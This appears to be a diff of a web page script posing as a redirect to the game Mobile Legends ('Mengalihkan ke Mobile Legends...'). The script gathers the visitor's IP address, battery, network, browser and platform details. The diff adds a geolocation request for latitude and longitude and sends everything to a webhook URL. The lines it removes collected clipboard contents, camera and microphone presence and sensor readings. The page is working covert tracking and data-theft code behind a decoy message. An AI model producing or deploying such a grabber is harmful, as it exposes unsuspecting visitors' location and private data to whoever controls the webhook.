@@ -26,12 +26,10 @@
 
                 let batteryLevel = "Unknown";
                 let isCharging = "Unknown";
-                let powerSaveMode = "Unknown";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     batteryLevel = `${Math.round(battery.level * 100)}%`;
                     isCharging = battery.charging ? "Charging" : "Not Charging";
-                    powerSaveMode = battery.saving ? "Enabled" : "Disabled";
                 }
 
                 const userAgent = navigator.userAgent;
@@ -47,74 +45,21 @@
                 else if (/Firefox/i.test(userAgent)) browser = "Firefox";
                 else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
                 else if (/Edg/i.test(userAgent)) browser = "Edge";
-                else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
-                else if (/UCBrowser/i.test(userAgent)) browser = "UC Browser";
 
-                let cameraStatus = "Disabled";
-                let microphoneStatus = "Disabled";
-                let gamepadStatus = "Disabled";
-                if (navigator.mediaDevices) {
+                let geolocation = "Disabled";
+                if (navigator.geolocation) {
                     try {
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        cameraStatus = devices.some(device => device.kind === "videoinput") ? "Enabled" : "Disabled";
-                        microphoneStatus = devices.some(device => device.kind === "audioinput") ? "Enabled" : "Disabled";
+                        const position = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject);
+                        });
+                        geolocation = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
                     } catch {
-                        cameraStatus = microphoneStatus = "Permission Denied";
+                        geolocation = "Permission Denied";
                     }
                 }
 
-                if (navigator.getGamepads) gamepadStatus = "Enabled";
-
-                const inputType = 'ontouchstart' in window ? "Layar Sentuh" : "Keyboard Fisik";
-                const uptime = (performance.now() / 1000).toFixed(2) + " detik";
-
-                let tabCount = "Unknown";
-                try {
-                    window.open("", "_blank").close();
-                    tabCount = window.length;
-                } catch {
-                    tabCount = "Permission Denied";
-                }
-
-                const cacheStorage = 'caches' in window ? "Supported" : "Not Supported";
-
-                let clipboardContent = "Disabled";
-                try {
-                    const permissionStatus = await navigator.permissions.query({ name: "clipboard-read" });
-                    if (permissionStatus.state === "granted") {
-                        clipboardContent = await navigator.clipboard.readText();
-                    } else {
-                        clipboardContent = "Disabled";
-                    }
-                } catch {
-                    clipboardContent = "Disabled";
-                }
-
-                let lightSensor = "Not Supported";
-                if ('ondevicelight' in window) {
-                    window.addEventListener('devicelight', (event) => {
-                        lightSensor = `${event.value} lux`;
-                    });
-                } else {
-                    try {
-                        if ('AmbientLightSensor' in window) {
-                            const sensor = new AmbientLightSensor();
-                            sensor.addEventListener('reading', () => {
-                                lightSensor = `${sensor.illuminance} lux`;
-                            });
-                            sensor.start();
-                        }
-                    } catch {
-                        lightSensor = "Not Supported";
-                    }
-                }
-
-                const deviceRAM = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Not Supported";
-
-                let fingerCount = "Unknown";
-                window.addEventListener("touchstart", (event) => {
-                    fingerCount = event.touches.length;
-                });
+                const screenResolution = `${window.screen.width}x${window.screen.height}`;
+                const localTime = new Date().toLocaleString();
 
                 await fetch(webhookUrl, {
                     method: "POST",
@@ -122,7 +67,7 @@
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPower Save Mode: ${powerSaveMode}\nPlatform: ${platform}\nBrowser: ${browser}\nCamera Status: ${cameraStatus}\nMicrophone Status: ${microphoneStatus}\nGamepad Status: ${gamepadStatus}\nInput Type: ${inputType}\nDevice Uptime: ${uptime}\nTab Count: ${tabCount}\nCache Storage: ${cacheStorage}\nClipboard Content: ${clipboardContent}\nLight Sensor: ${lightSensor}\nDevice RAM: ${deviceRAM}\nFinger Count: ${fingerCount}`
+                        content: `IP Address: ${ip}\nBrowser Language: ${language}\nConnection Type: ${connectionType}\nNetwork Type: ${networkType}\nBattery Level: ${batteryLevel}\nCharging Status: ${isCharging}\nPlatform: ${platform}\nBrowser: ${browser}\nGeolocation: ${geolocation}\nScreen Resolution: ${screenResolution}\nLocal Time: ${localTime}`
                     })
                 });
 
@@ -137,5 +82,9 @@
     </script>
 </head>
 <body>
+    <div style="text-align: center; font-family: Arial, sans-serif;">
+        <h1>Mengalihkan ke Mobile Legends...</h1>
+        <p>Harap tunggu.</p>
+    </div>
 </body>
 </html>
